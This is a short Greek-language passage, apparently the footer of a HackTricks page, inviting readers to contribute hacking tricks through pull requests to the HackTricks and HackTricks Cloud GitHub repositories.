 * **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
